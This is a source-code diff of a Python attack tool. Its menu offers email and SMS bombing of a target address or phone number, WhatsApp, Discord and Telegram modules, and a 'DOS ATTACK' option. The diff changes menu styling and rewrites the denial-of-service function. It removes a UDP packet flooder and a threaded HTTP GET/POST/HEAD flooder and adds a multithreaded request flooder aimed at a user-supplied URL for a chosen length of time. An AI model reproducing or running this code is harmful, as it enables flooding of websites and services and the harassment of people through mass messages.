@@ -43,11 +43,11 @@ from progress.bar import Bar
 from threading import Thread
 from requests import get, post
 from selenium import webdriver
-from colorama import Fore, Back
 from os.path import exists, isfile
 from random import choice, randint
 from progress.spinner import Spinner
 from selenium.webdriver.common.by import By
+from colorama import Fore, Back, Style, init
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.ui import WebDriverWait
 from webdriver_manager.chrome import ChromeDriverManager
@@ -9307,17 +9307,6 @@ def pb4():
 		spinner.next()
 	spinner.finish()
 
-def logo():
-	print("\033[31m\033[0m{}" .format('╔══╗   ╔═╗╔═╦╗ ╔═══╗'), "\033[35m\033[5m{}" .format('  ╔═══╗╔═══╗'))
-	print("\033[31m\033[0m{}" .format('║╔╗║   ║ ╚╝ ║║ ║╔══╝'), "\033[35m\033[5m{}" .format('  ║╔═╗║║╔═╗║'))
-	print("\033[31m\033[0m{}" .format('║╚╝╚╦══╣╔╗╔╗║╚═╣╚══╦═╗'), "\033[35m\033[5m{}" .format(' ╚╔╝║║║ ║║'))
-	print("\033[31m\033[0m{}" .format('║╔═╗║╔╗║║║║║║╔╗║╔══╣╔╝'), "\033[35m\033[5m{}" .format('╔═╝╔╝║║ ║║'))
-	print("\033[31m\033[0m{}" .format('║╚═╝║╚╝║║║║║║╚╝║╚══╣║'), "\033[35m\033[5m{}" .format(' ║ ╚═╦╣╚═╝║'))
-	print("\033[31m\033[0m{}" .format('╚═══╩══╩╝╚╝╚╩══╩═══╩╝'), "\033[35m\033[5m{}" .format(' ╚═══╩╩═══╝'))
-	print("\033[41m\033[37m\033[5m{}" .format('''\nCreated by Eban'ko - https://github.com/ebankoff\n'''))
-	print("\033[41m\033[37m\033[5m{}" .format('''License - Apache 2.0\n'''))
-	print("\033[43m\033[35m\033[5m{}" .format('''There could have been your ad here)'''))
-
 def check_internet():
 	try:
 		pb1()
@@ -9355,12 +9344,8 @@ def ex():
 		input()
 		exit()
 	elif param == 'no':
-		if platform=='win32':
-			os.system("cls")
-
-		else:
-			os.system("clear")
 		main()
+
 	else:
 		print('ERROR: invalid value')
 		ex()
@@ -9370,13 +9355,19 @@ def generate_proxy():
 	return {"http": proxy, "https": proxy}
 
 def emailbomber():
-	print("\033[33m{}" .format('''
+	if platform == 'win32':
+		os.system("cls")
+
+	else:
+		os.system("clear")
+
+	print(Fore.YELLOW + Style.BRIGHT +'''
 ╔═══╦═╗╔═╦═══╦══╦╗
 ║╔══╣ ╚╝ ║╔═╗╠╣╠╣║
 ║╚══╣╔╗╔╗║║ ║║║║║║
 ║╔══╣║║║║║╚═╝║║║║║ ╔╗
 ║╚══╣║║║║║╔═╗╠╣╠╣╚═╝║
-╚═══╩╝╚╝╚╩╝ ╚╩══╩═══╝\n'''))
+╚═══╩╝╚╝╚╩╝ ╚╩══╩═══╝\n''')
 
 	try:
 		TO = str(input('Enter target email: '))
@@ -9414,14 +9405,20 @@ def emailbomber():
 		ex()
 
 def smsbomber():
-	print("\033[33m{}" .format('''
+	if platform == 'win32':
+		os.system("cls")
+
+	else:
+		os.system("clear")
+
+	print(Fore.YELLOW + Style.BRIGHT +'''
 ╔═══╦═╗╔═╦═══╗
 ║╔═╗║ ╚╝ ║╔═╗║
 ║╚══╣╔╗╔╗║╚══╗
 ╚══╗║║║║║╠══╗║
 ║╚═╝║║║║║║╚═╝║
 ╚═══╩╝╚╝╚╩═══╝
-		'''))
+		''')
 	try:
 		code=input('Enter your country code without +: ')
 		number = code+input(f'Enter the number for attack: {code}')
@@ -9436,159 +9433,81 @@ def smsbomber():
 		ex()
 
 def dos():
-	print("\033[32m{}" .format('''
+	if platform == 'win32':
+		os.system("cls")
+
+	else:
+		os.system("clear")
+
+	def dos2(target, tm):
+		lib = ['fdgjnhdoreoijdgf', 'regg343423', 'rrewfsfefgwerg', 'wejfsdv']
+		while time.monotonic() - t <= tm:
+			try:
+				now = datetime.datetime.now()
+				res = requests.get(target)
+				res2 = requests.post(target, headers=HEADERS)
+				res3 = requests.get(target, auth=('username', 'fakepass'))
+				res4 = requests.get(target + '/' + random.choice(lib))
+				print("\033[32m {}" .format(f'ATTACKING...'))
+			
+			except:
+				pass
+
+		if platform == 'win32':
+			os.system("cls")
+
+		else:
+			os.system("clear")
+		
+		print("Finished!")
+		ex()
+
+	if platform == 'win32':
+		os.system("cls")
+
+	else:
+		os.system("clear")
+
+	print(Fore.YELLOW + Style.BRIGHT +'''
 ╔═══╦═══╦═══╗ ╔═══╦════╦════╦═══╦═══╦╗╔═╗
 ╚╗╔╗║╔═╗║╔═╗║ ║╔═╗║╔╗╔╗║╔╗╔╗║╔═╗║╔═╗║║║╔╝
  ║║║║║ ║║╚══╗ ║║ ║╠╝║║╚╩╝║║╚╣║ ║║║ ╚╣╚╝╝
  ║║║║║ ║╠══╗║ ║╚═╝║ ║║   ║║ ║╚═╝║║ ╔╣╔╗║
 ╔╝╚╝║╚═╝║╚═╝║ ║╔═╗║ ║║   ║║ ║╔═╗║╚═╝║║║╚╗
 ╚═══╩═══╩═══╝ ╚╝ ╚╝ ╚╝   ╚╝ ╚╝ ╚╩═══╩╝╚═╝
-		'''))
+		''')
 
-	t = time.monotonic()
-
-	print('''1 - IP 
-2 - URL\n''')
-	
 	try:
-		ans=int(input('> '))
+		url = input("URL: ")
+		tm = int(input("Attack time in seconds: "))
+		threads = int(input("Threads: "))
+		t = time.monotonic()
+		HEADERS = random.choice(heads)
 
-		if ans == 1:
-			time2 = int(input("\nAttak time in minuets: "))
-			time2*=60
+		for i in range(0, threads):
+			thr = threading.Thread(target=dos2, args=(url, tm,))
+			thr.start()
+			print(str(i + 1) + " thread started!")
 
-			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			bytes = "qwerty"*2000
-			sent = 0
-			max = 1000
-
-			ips = input("IP for attack: ")
-			ips = (ips+",").split(",")
-			ips.pop()
-
-			ports = input("Ports (80; 80,8080,443; all): ")
-			if ports != "all":
-				ports = (ports+",").split(",")
-				ports.pop()
-
-			mode = input("Enable slow mode? (y/n): ")
-
-			time.sleep(0.5)
-
-			def attack(ip, port):
-				global sent
-				global max
-				
-				sock.sendto(str.encode(bytes), (ip,int(port)))
-				sent += 1
-				print("%s packages - %s:%s"%(sent,ip,port))
-
-				if mode == "y":
-					if sent == max:
-						max += 1000
-						time.sleep(0.5)
-
-			port_for_fast = 1
-			while time.monotonic() - t < time2:
-				for ip in ips:
-					try:
-						if ports != "all":
-							for port in ports:
-								attack(ip, port)
-						else:
-							attack(ip, port_for_fast)
-							
-							port_for_fast += 1
-							if port_for_fast == 65536:
-								port_for_fast = 1
-					except:
-						print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'ATTACK') + "\033[37m {}" .format('|') + "\033[35m {}" .format(ip))
-
-			print("\033[32m {}" .format("\nFinished!"))
-			ex()
-
-		elif ans == 2:
-			try:
-				time3 = int(input("\nAttak time in minuets: "))
-				url=input("URL for attack: ")
-				time3*=60
-
-				def dos1(url):
-					while time.monotonic() - t < time3:
-						requests.get(url, headers=headers)
-						print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'GET ') + "\033[37m {}" .format('|') + "\033[35m {}" .format(url))
-						requests.post(url, headers=headers)
-						print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'POST') + "\033[37m {}" .format('|') + "\033[35m {}" .format(url))
-						requests.head(url, headers=headers)
-						print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'HEAD') + "\033[37m {}" .format('|') + "\033[35m {}" .format(url))
-						
-				def dos2(url):
-					while time.monotonic() - t < time3:
-						requests.get(url, headers=headers)
-						print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'GET ') + "\033[37m {}" .format('|') + "\033[35m {}" .format(url))
-						requests.post(url, headers=headers)
-						print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'POST') + "\033[37m {}" .format('|') + "\033[35m {}" .format(url))
-						requests.head(url, headers=headers)
-						print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'HEAD') + "\033[37m {}" .format('|') + "\033[35m {}" .format(url))
-				
-				def dos3(url):
-					while time.monotonic() - t < time3:
-						requests.get(url, headers=headers)
-						print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'GET ') + "\033[37m {}" .format('|') + "\033[35m {}" .format(url))
-						requests.post(url, headers=headers)
-						print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'POST') + "\033[37m {}" .format('|') + "\033[35m {}" .format(url))
-						requests.head(url, headers=headers)
-						print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'HEAD') + "\033[37m {}" .format('|') + "\033[35m {}" .format(url))
-
-				def dos4(url):
-					while time.monotonic() - t < time3:
-						requests.get(url, headers=headers)
-						print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'GET ') + "\033[37m {}" .format('|') + "\033[35m {}" .format(url))
-						requests.post(url, headers=headers)
-						print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'POST') + "\033[37m {}" .format('|') + "\033[35m {}" .format(url))
-						requests.head(url, headers=headers)
-						print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'HEAD') + "\033[37m {}" .format('|') + "\033[35m {}" .format(url))
-
-				t1 = Thread(target=dos1, args = (url, ))
-				t2 = Thread(target=dos2, args = (url, ))
-				t3 = Thread(target=dos3, args = (url, ))
-				t4 = Thread(target=dos4, args = (url, ))
-
-				while time.monotonic() - t < time3:
-					t1.start()
-					t2.start()
-					t3.start()
-					t4.start()
-
-					t1.join()
-					t2.join()
-					t3.join()
-					t4.join()
-
-				print("\033[32m {}" .format("\nFinished!"))
-				ex()
-
-			except:
-				print("\033[31m{}" .format("ERROR!"))
-				ex()
-
-		else:
-			print("\033[31m{}" .format('ERROR: INVALID VALUE!'))
-			ex()
 	except:
-		print("\033[31m{}" .format('\nERROR: INVALID VALUE!'))
+		print("ERROR: Invalid value!")
 		ex()
 
 def wtsap():
-	print('''\033[32m
+	if platform == 'win32':
+		os.system("cls")
+
+	else:
+		os.system("clear")
+	print(Fore.YELLOW + Style.BRIGHT +'''
 ╔╗╔╗╔╦╗    ╔╗   ╔═══╗
 ║║║║║║║   ╔╝╚╗  ║╔═╗║
 ║║║║║║╚═╦═╩╗╔╬══╣║ ║╠══╦══╗
 ║╚╝╚╝║╔╗║╔╗║║║══╣╚═╝║╔╗║╔╗║
 ╚╗╔╗╔╣║║║╔╗║╚╬══║╔═╗║╚╝║╚╝║
  ╚╝╚╝╚╝╚╩╝╚╩═╩══╩╝ ╚╣╔═╣╔═╝
-		    ║║ ║║
-		    ╚╝ ╚╝
+                    ║║ ║║
+                    ╚╝ ╚╝
 		''')
 
 	try:
@@ -9622,14 +9541,19 @@ def wtsap():
 		ex()
 
 def dscrd():
-	print("\033[32m{}" .format('''
+	if platform == 'win32':
+		os.system("cls")
+
+	else:
+		os.system("clear")
+	print(Fore.YELLOW + Style.BRIGHT +'''
 ╔═══╗             ╔╗
 ╚╗╔╗║             ║║
  ║║║╠╦══╦══╦══╦═╦═╝║
  ║║║╠╣══╣╔═╣╔╗║╔╣╔╗║
 ╔╝╚╝║╠══║╚═╣╚╝║║║╚╝║
 ╚═══╩╩══╩══╩══╩╝╚══╝
-		'''))
+		''')
 
 	try:
 		ID = input("Channel ID: ")
@@ -9666,7 +9590,12 @@ def dscrd():
 		ex()
 
 def telega():
-	print('''\033[32m
+	if platform == 'win32':
+		os.system("cls")
+
+	else:
+		os.system("clear")
+	print(Fore.YELLOW + Style.BRIGHT +'''
 ╔════╗ ╔╗
 ║╔╗╔╗║ ║║
 ╚╝║║╠╩═╣║╔══╦══╦═╦══╦╗╔╗
@@ -9711,15 +9640,31 @@ def telega():
 		ex()
 
 def main():
+	if platform == 'win32':
+		os.system("cls")
+
+	else:
+		os.system("clear")
+
+	print("\033[31m\033[0m{}" .format('╔══╗   ╔═╗╔═╦╗ ╔═══╗'), "\033[35m\033[5m{}" .format('  ╔═══╗╔═══╗'))
+	print("\033[31m\033[0m{}" .format('║╔╗║   ║ ╚╝ ║║ ║╔══╝'), "\033[35m\033[5m{}" .format('  ║╔═╗║║╔═╗║'))
+	print("\033[31m\033[0m{}" .format('║╚╝╚╦══╣╔╗╔╗║╚═╣╚══╦═╗'), "\033[35m\033[5m{}" .format(' ╚╔╝║║║ ║║'))
+	print("\033[31m\033[0m{}" .format('║╔═╗║╔╗║║║║║║╔╗║╔══╣╔╝'), "\033[35m\033[5m{}" .format('╔═╝╔╝║║ ║║'))
+	print("\033[31m\033[0m{}" .format('║╚═╝║╚╝║║║║║║╚╝║╚══╣║'), "\033[35m\033[5m{}" .format(' ║ ╚═╦╣╚═╝║'))
+	print("\033[31m\033[0m{}" .format('╚═══╩══╩╝╚╝╚╩══╩═══╩╝'), "\033[35m\033[5m{}" .format(' ╚═══╩╩═══╝'))
+	print("\033[41m\033[37m\033[5m{}" .format('''\nCreated by Eban'ko - https://github.com/ebankoff\n'''))
+	print("\033[41m\033[37m\033[5m{}" .format('''License - Apache 2.0\n'''))
+	print("\033[43m\033[35m\033[5m{}" .format('''There could have been your ad here)'''))
+
 	print('''\033[0m\033[40m\033[36m
-[0] Update the program   [4] WhatsApp
-[1] Email                [5] Discord
-[2] SMS                  [6] Telegram
-[3] DOS ATTACK           [7] Clear the program cache
+\033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m0\033[0m\033[40m\033[35m]\033[36m Update the program   \033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m4\033[0m\033[40m\033[35m] WhatsApp
+\033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m1\033[0m\033[40m\033[35m]\033[36m Clear cache          \033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m5\033[0m\033[40m\033[35m] Discord
+\033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m2\033[0m\033[40m\033[35m] SMS                  \033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m6\033[0m\033[40m\033[35m] Telegram
+\033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m3\033[0m\033[40m\033[35m] DOS ATTACK           \033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m7\033[0m\033[40m\033[35m] Email
 	''')
 
 	try:
-		ans=int(input("\033[33m{}" .format("> ")))
+		ans = int(input('\033[0m\033[40m\033[35m → \033[32m'))
 		print("")
 
 		if ans==0:
@@ -9730,24 +9675,6 @@ def main():
 			print("\033[31m{}" .format('To complete the update, you need to restart the program'))
 			ex()
 		elif ans==1:
-			check_internet()
-			emailbomber()
-		elif ans==2:
-			check_internet()
-			smsbomber()
-		elif ans==3:
-			check_internet()
-			dos()
-		elif ans==4:
-			check_internet()
-			wtsap()
-		elif ans==5:
-			check_internet()
-			dscrd()
-		elif ans==6:
-			check_internet()
-			telega()
-		elif ans==7:
 			try:
 				pb4()
 				shutil.rmtree('__pycache__')
@@ -9756,6 +9683,31 @@ def main():
 			except:
 				print("\033[31m{}" .format('ERROR: The program cache is already empty!'))
 				ex()
+
+		elif ans==2:
+			check_internet()
+			smsbomber()
+
+		elif ans==3:
+			check_internet()
+			dos()
+
+		elif ans==4:
+			check_internet()
+			wtsap()
+
+		elif ans==5:
+			check_internet()
+			dscrd()
+
+		elif ans==6:
+			check_internet()
+			telega()
+
+		elif ans==7:
+			check_internet()
+			emailbomber()
+
 		else:
 			print("\033[31m{}" .format('ERROR: INVALID VALUE!'))
 			ex()
@@ -9765,5 +9717,4 @@ def main():
 		ex()
 
 if __name__=='__main__':
-	logo()
 	main()
